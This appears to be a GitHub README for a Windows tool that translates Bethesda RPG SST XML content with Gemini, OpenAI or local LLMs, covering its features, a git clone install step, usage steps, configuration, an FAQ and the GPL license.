# Bethesda AI Translator - AI localization tool 2026

> **Bethesda AI Translator is a Windows tool for translating Bethesda RPG content with AI assistance, SST XML workflow support, and version 2026 localization features.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/matt-bennett1995/bethesda-rpg-translator-ai?style=flat-square)](https://github.com/matt-bennett1995/bethesda-rpg-translator-ai)

---

<p align="center">
  <a href="https://matt-bennett1995.github.io/bethesda-rpg-translator-ai/">
    <img src="https://img.shields.io/badge/Download-Bethesda%20AI%20Translator%20Latest-brightgreen?style=for-the-badge" alt="Download Bethesda AI Translator">
  </a>
</p>

> **[Download Latest Build](https://matt-bennett1995.github.io/bethesda-rpg-translator-ai/)**

---

[Download Latest Build](https://matt-bennett1995.github.io/bethesda-rpg-translator-ai/)

---

## Overview

Bethesda AI Translator is a localization utility created for Bethesda RPG projects, with a focus on games like Skyrim, Fallout, and Starfield. It is designed around SST XML translation workflows and combines AI-assisted editing with game-sensitive context so translators, mod authors, and localization teams can move through content more efficiently.

The app can work with both cloud and local translation engines. You can connect it to Gemini or OpenAI, or use a local LLM through Ollama or LM Studio. It also provides tools for glossary handling, proper noun tracking, and NPC dialogue styling, which helps keep larger translation sets aligned.

---

## Key Features

- AI-assisted translation pipeline for Bethesda RPG localization
- SST XML import and export support for translation workflows
- Game preset-based context awareness for more relevant translations
- NPC dialogue profile support for natural in-game wording
- Glossary tools for recurring terms and project-specific vocabulary
- Proper noun extraction to support consistent naming
- API throttling and auto-recovery for steadier service usage
- Local LLM integration through Ollama and LM Studio
- Multi-language UI and target-language support
- Local storage with JSON import and export capabilities

---

## Installation

You can clone the repository or download the project files, then open the Windows application from the compiled output or from your preferred development setup.

git clone https://github.com/matt-bennett1995/bethesda-rpg-translator-ai.git

Once the project is ready, launch the app from the desktop build or run it through the workflow you use for local development.

---

## Usage

1. Start the app on Windows.
2. Import or open your Bethesda SST XML content.
3. Pick a translation backend such as Gemini, OpenAI, or a local LLM.
4. Choose the game preset that matches the project.
5. Check glossary entries and extracted proper nouns before exporting.
6. Run the translation process, then export the updated XML when finished.

Example workflow:

- Import SST XML
- Set source and target language
- Apply NPC dialogue profile if needed
- Review glossary terms
- Export the translated file

---

## Configuration

Most options are configured inside the application and saved on the local machine. If you want to move project data to another computer or keep a shared setup, use the built-in JSON import and export features.

Typical configuration areas include:

- translation provider selection
- API settings and throttling behavior
- glossary data
- local project persistence
- language preferences
- game-specific presets

---

## Requirements

- Windows platform
- Access to a supported AI provider such as Gemini or OpenAI, or a local LLM setup through Ollama or LM Studio
- Sufficient storage for project files, exported XML, and local JSON data
- A modern runtime for the desktop app stack built with Tauri, React, and TypeScript

---

## FAQ

### Which games is it intended for?
It is aimed at Bethesda RPG localization workflows, including Skyrim, Fallout, and Starfield-related projects.

### Can I use it without a cloud API?
Yes. Local LLM support is available through Ollama and LM Studio.

### Is it suitable for dialogue-heavy work?
Yes. NPC dialogue profile support and glossary tools are included to help keep conversational text consistent.

### Where are settings saved?
Settings stay on the local machine, and you can transfer data with the JSON import and export workflow.

### What happens if the translation service drops out?
API throttling and auto-recovery are included to help the workflow continue after interruptions.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
